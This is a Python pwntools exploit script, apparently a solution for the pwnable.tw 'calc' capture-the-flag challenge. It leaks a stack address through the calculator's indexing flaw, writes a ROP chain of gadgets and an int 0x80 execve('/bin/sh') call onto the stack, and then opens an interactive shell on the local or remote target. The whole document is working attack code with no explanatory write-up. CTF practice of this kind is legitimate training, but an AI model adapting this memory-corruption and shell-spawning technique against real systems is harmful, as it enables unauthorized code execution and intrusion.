from pwn import *
import sys,getopt
import time

args = sys.argv[1:]
context(os='linux', arch='i386')
debug = 1 if '-nd' not in args else 0

proc_name = './calc'
local = 1 if '-r' not in args else 0
isattach = local & 0 
bps = isattach & 1 
ip = 'chall.pwnable.tw'
port = 10100
io = None


def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def sd(data):
	return io.send(data)
def rl():
	return io.recvline()
def lg(data):
    return log.info(data)


#360     ebp addr_360 = ebp-0x20
#361     0x80701d0 :pop edx ; pop ecx ; pop ebx ; ret
#362     0
#363     0
#364     addr of /bin/sh ; should calc its offset
#365     0x0805c34b : pop eax ; ret
#366     11
#367     0x08049a21 : int 0x80
#368     u32('/bin/'')
#369     u32('sh\x00')

rop = [0x80701d0,0,0,0xdeadbeaf,0x0805c34b,11,0x08049a21,u32('/bin'),u32('/sh\x00')]


def get_stack(data):
    sl('+' + str(data))
    stack = rv()
    try:
        stack = int(stack.replace('\n',''))
    except:
        pass
    if stack < 0:
        stack += 0x100000000

    return stack
    
def write_stack(data,value):
    stack = get_stack(data)
    lg(str(data)+' stack is' + hex(stack))
    offset = value - stack 
    if offset > 0:
        new_stack = get_stack( str(data) + '+' + str(offset))
    else:
        new_stack = get_stack( str(data) + str(offset))
    lg(str(data)+'stack is reset to' + hex(new_stack))
    
def attach():
    if isattach:
        if bps:
            gdb.attach(pidof(io)[0], open('printbps'))
        else:
            gdb.attach(pidof(io)[0])
 
def pwn():
    makeio()
    if debug:
        context.log_level = 'debug'
    
    ru('calculator ===')
    get_stack('1')
    rv()
    ebp = get_stack(360) -0x20 
    rop[3] = ebp + 0x4*8 - 0x100000000
     
    print ebp 
    log.info('ebp addr is' + hex(ebp) + '|' + hex(rop[6]))
    for i in range(0,len(rop)):
        stack_i = i + 361
        log.info(stack_i)
        write_stack(stack_i,rop[i])
    attach()
    sl('quit') 

    io.interactive()


if __name__ == '__main__':
	pwn()



